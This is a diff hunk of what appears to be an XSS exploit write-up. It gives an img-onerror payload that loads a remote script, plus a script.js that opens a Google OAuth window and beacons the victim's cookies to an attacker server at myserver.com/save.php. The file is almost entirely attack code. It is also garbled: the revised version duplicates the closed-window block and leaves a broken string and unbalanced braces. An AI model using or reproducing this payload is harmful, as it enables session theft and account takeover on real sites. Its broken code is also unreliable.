@@ -19,23 +19,38 @@ XSS Payload:
 <img/src/onerror='s=document.createElement("script");s.src="https://myserver/script.js";document.body.append(s);'>
 ```
 
-script.js:
+script.js INCOMPLETE CODE:
 ```
-let exploitWindow = window.open('https://accounts.google.com/o/oauth2/auth?redirect_uri=https://example.com/auth/google/callback&response_ty
-"example",
-"width=600,height=400, status=yes,scrollbars=yes, resizable=yes",
+let exploitWindow = window.open('https://accounts.google.com/o/oauth2/auth?redirect_uri=https://example.com/auth/google/callback&response_type=",
+    "example",
+    "width=600,height=400, status=yes,scrollbars=yes, resizable=yes",
+
 );
+
 // checking the cookies and sending them to server
 var checkClosed = setInterval(function () {
-navigator.sendBeacon (
-"https://myserver.com/save.php",
-JSON.stringify({ cookiex: exploitWindow.document.cookie }),
+navigator.sendBeacon("https://myserver.com/save.php",
+    JSON.stringify({ cookiex: exploitWindow.document.cookie }),
 );
+
 if (exploitWindow.closed) {
-clearInterval(checkClosed);
-var cookies = document.cookie;
-alert(cookies);
-console.log(cookies);
-navigator.sendBeacon (
-"https://myserver.com/save.php",
+    clearInterval(checkClosed);
+    var cookies = document.cookie;
+    alert(cookies);
+    console.log(cookies);
+    navigator.sendBeacon("https://myserver.com/save.php",
+        JSON.stringify({ cookiex: exploitWindow.document.cookie }),
+    );
+
+    if (exploitWindow.closed) {
+        clearInterval(checkClosed);
+        var cookies = document.cookie;
+        alert(cookies);
+        console.log(cookies);
+        navigator.sendBeacon (
+            "https://myserver.com/save.php",
+            JSON.stringify({ cookie: cookies }),
+        );
+    }
+}, 1000);
 ```
